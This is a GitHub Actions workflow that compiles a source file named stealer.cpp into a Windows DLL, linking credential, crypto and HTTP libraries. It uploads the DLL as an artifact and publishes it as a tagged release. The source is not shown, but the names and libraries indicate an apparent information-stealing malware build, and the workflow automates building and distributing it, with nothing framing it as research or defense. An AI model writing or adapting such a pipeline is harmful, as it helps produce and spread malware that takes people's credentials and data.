name: build-dll

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup MSVC
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x64

      - name: Build DLL
        shell: cmd
        run: |
          cl /LD /O2 /EHsc stealer.cpp advapi32.lib crypt32.lib winhttp.lib /Fe:stealer.dll
          if not exist stealer.dll (
            echo "Build failed"
            exit /b 1
          )
          dir stealer.dll

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: stealer-dll
          path: stealer.dll
          if-no-files-found: error

      - name: Create release
        if: startsWith(github.ref, 'refs/tags/')
        uses: softprops/action-gh-release@v2
        with:
          files: stealer.dll
          generate_release_notes: true
